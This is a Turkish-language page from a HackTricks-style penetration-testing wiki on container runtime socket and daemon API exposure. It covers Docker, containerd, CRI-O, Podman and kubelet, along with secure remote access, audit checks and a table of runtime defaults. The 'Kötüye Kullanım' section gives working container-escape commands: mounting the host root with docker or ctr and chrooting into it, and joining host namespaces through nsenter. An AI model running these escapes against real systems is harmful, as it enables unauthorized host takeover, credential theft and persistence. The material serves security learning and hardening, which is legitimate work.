# Çalışma Zamanı API'si ve Daemon Açığa Çıkması

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Birçok gerçek konteyner ele geçirme olayı hiç de bir namespace kaçışıyla başlamaz. Çoğunlukla çalışma zamanı kontrol düzlemine erişimle başlarlar. Bir workload bir mount edilmiş Unix soketi veya açığa çıkmış bir TCP dinleyicisi aracılığıyla `dockerd`, `containerd`, CRI-O, Podman veya kubelet ile konuşabiliyorsa, saldırgan daha yüksek ayrıcalıklara sahip yeni bir konteyner talep edebilir, host dosya sistemini mount edebilir, host namespace'lerine katılabilir veya hassas node bilgilerini elde edebilir. Bu durumlarda runtime API gerçek güvenlik sınırıdır ve onu ele geçirmek fonksiyonel olarak host'u ele geçirmekle yakındır.

Bu yüzden runtime soket açığa çıkmasının kernel korumalarından ayrı olarak belgelenmesi gerekir. Olağan seccomp, capabilities ve MAC confinement ile sınırlandırılmış bir konteyner bile, içinde `/var/run/docker.sock` veya `/run/containerd/containerd.sock` mount edilmişse host ele geçirilmesine sadece bir API çağrısı uzak olabilir. Mevcut konteynerin kernel izolasyonu tam olarak tasarlandığı gibi çalışıyor olabilir; ancak runtime yönetim düzlemi tamamen açık kalabilir.

## Daemon Erişim Modelleri

Docker Engine geleneksel olarak ayrıcalıklı API'sini yerel Unix soketi `unix:///var/run/docker.sock` üzerinden açar. Tarihsel olarak ayrıca `tcp://0.0.0.0:2375` gibi TCP dinleyicileri veya `2376` üzerinde TLS korumalı bir dinleyici aracılığıyla uzaktan da açılmıştır. Daemon'u güçlü TLS ve istemci doğrulaması olmadan uzaktan açmak, Docker API'sini fiilen uzaktan root arayüzüne çevirir.

containerd, CRI-O, Podman ve kubelet benzer yüksek etkili yüzeyler açar. İsimler ve iş akışları farklı olabilir, ama mantık aynı kalır. Eğer arayüz çağıranın workload oluşturmasına, host yollarını mount etmesine, kimlik bilgileri almasına veya çalışan konteynerleri değiştirmesine izin veriyorsa, arayüz ayrıcalıklı bir yönetim kanalıdır ve buna göre muamele edilmelidir.

Kontrol edilmesi gereken yaygın yerel yollar şunlardır:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Daha eski veya daha uzmanlaşmış stack'ler `dockershim.sock`, `frakti.sock` veya `rktlet.sock` gibi uç noktaları da açabilir. Bunlar modern ortamlarda daha az yaygındır, ancak karşılaşıldıklarında sıradan uygulama soketlerinden ziyade runtime kontrol yüzeylerini temsil ettikleri için aynı dikkatle ele alınmalıdır.

## Güvenli Uzaktan Erişim

Bir daemon yerel soketin ötesinde açılmak zorundaysa, bağlantı TLS ile korunmalı ve tercihen karşılıklı kimlik doğrulama ile sağlanmalıdır; böylece daemon istemciyi ve istemci daemoni doğrular. Kolaylık için Docker daemon'ını düz HTTP üzerinde açma alışkanlığı, API yüzeyi doğrudan ayrıcalıklı container'lar oluşturacak kadar güçlü olduğundan container yönetiminde en tehlikeli hatalardan biridir.

Tarihi Docker yapılandırma deseni şu şekilde görünüyordu:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
On systemd-based hosts, daemon iletişimi `fd://` olarak da görünebilir; bu, işlemin kendisinin doğrudan bind etmesi yerine systemd'den önceden açılmış bir socket'i devraldığı anlamına gelir. Önemli olan ders tam sözdizimi değil, güvenlik sonucudur. Daemon, sıkı izinlendirilmiş bir local socket'in ötesinde dinlemeye başladığı anda, transport security ve client authentication zorunlu hale gelir; isteğe bağlı sertleştirme olmaktan çıkar.

## Kötüye Kullanım

Eğer bir runtime socket mevcutsa, hangisi olduğunu, uyumlu bir client'ın olup olmadığını ve raw HTTP veya gRPC erişiminin mümkün olup olmadığını doğrulayın:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Bu komutlar faydalıdır çünkü bir dead path, mount edilmiş fakat erişilemez bir socket ve canlı ayrıcalıklı bir API arasındaki farkı ayırt ederler. Eğer client başarılı olursa, sonraki soru API'nin host bind mount veya host namespace sharing ile yeni bir container başlatıp başlatamayacağıdır.

### Tam Örnek: Docker Socket To Host Root

Eğer `docker.sock` erişilebilirse, klasik kaçış yöntemi host root dosya sistemini mount eden yeni bir container başlatmak ve sonra `chroot` yapmaktır:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Bu, Docker daemon aracılığıyla doğrudan host-root yürütümü sağlar. Etki yalnızca dosya okumayla sınırlı değildir. Yeni container içine girdikten sonra saldırgan host dosyalarını değiştirebilir, credentials toplayabilir, persistence implantlayabilir veya ek privileged workloads başlatabilir.

### Tam Örnek: Docker Socket To Host Namespaces

Saldırgan filesystem-only access yerine namespace entry'yi tercih ediyorsa:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Bu yol, mevcut olanı istismar etmek yerine runtime'dan host-namespace'e açık şekilde erişim sağlayan yeni bir container oluşturmasını isteyerek host'a ulaşır.

### Tam Örnek: containerd Socket

Mount edilmiş `containerd` socket genellikle aynı derecede tehlikelidir:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Etkisi yine host compromise'tir. Docker'a özgü araçlar olmasa bile, başka bir runtime API hâlâ aynı yönetici yetkisini sağlayabilir.

## Checks

Bu kontrollerin amacı, container'ın güven sınırının dışında kalması gereken herhangi bir yönetim düzlemiyle erişim kurup kuramayacağını yanıtlamaktır.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Burada ilginç olanlar:

- Mount edilmiş runtime soketi genellikle sadece bilgi ifşası değil, doğrudan bir yönetimsel ilkeliktir.
- TLS olmadan `2375`'te bir TCP dinleyicisi uzak ele geçirme durumu olarak değerlendirilmelidir.
- `DOCKER_HOST` gibi ortam değişkenleri genellikle iş yükünün host runtime ile iletişim kuracak şekilde kasıtlı olarak tasarlandığını gösterir.

## Runtime Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatmalar |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak yerel Unix soketi | `dockerd` yerel soketi dinler ve daemon genellikle root yetkisine sahiptir | `/var/run/docker.sock`'un mount edilmesi, `tcp://...:2375`'in açılması, `2376`'da zayıf veya eksik TLS |
| Podman | Varsayılan olarak daemonless CLI | Olağan yerel kullanım için uzun ömürlü ayrıcalıklı bir daemon gerekmez; `podman system service` etkinleştirildiğinde API soketleri yine de açılabilir | `podman.sock`'un açılması, servisin geniş kapsamda çalıştırılması, root yetkili API kullanımı |
| containerd | Yerel ayrıcalıklı soket | Yönetim API'si yerel soket üzerinden açılır ve genellikle üst düzey araçlar tarafından kullanılır | `containerd.sock`'un mount edilmesi, geniş `ctr` veya `nerdctl` erişimi, ayrıcalıklı namespace'lerin açılması |
| CRI-O | Yerel ayrıcalıklı soket | CRI uç noktası node-yerel güvenilir bileşenler içindir | `crio.sock`'un mount edilmesi, CRI uç noktasının güvensiz iş yüklerine açılması |
| Kubernetes kubelet | Düğüm-yerel yönetim API'si | Kubelet Pod'lardan geniş şekilde erişilebilir olmamalıdır; erişim pod durumunu, kimlik bilgilerini ve authn/authz'e bağlı olarak yürütme özelliklerini ortaya çıkarabilir | kubelet soketlerinin veya sertifikalarının mount edilmesi, zayıf kubelet kimlik doğrulaması, host networking ile ulaşılabilir kubelet uç noktası |
{{#include ../../../banners/hacktricks-training.md}}
